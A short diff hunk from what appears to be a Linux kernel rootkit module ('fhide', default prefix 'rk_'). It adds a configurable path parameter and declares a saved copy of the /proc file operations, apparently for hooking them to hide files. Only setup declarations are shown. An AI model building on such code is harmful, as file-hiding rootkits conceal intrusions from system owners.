@@ -21,6 +21,9 @@ module_exit(fhide_exit);
 static char *prefix = "rk_";
 module_param(prefix, charp, S_IRUGO);
 
+static char *kpath = "/";
+module_param(kpath, charp, S_IRUGO);
+
 struct file_operations proc_fops;
 const struct file_operations *backup_proc_fops;
 struct inode *proc_inode;
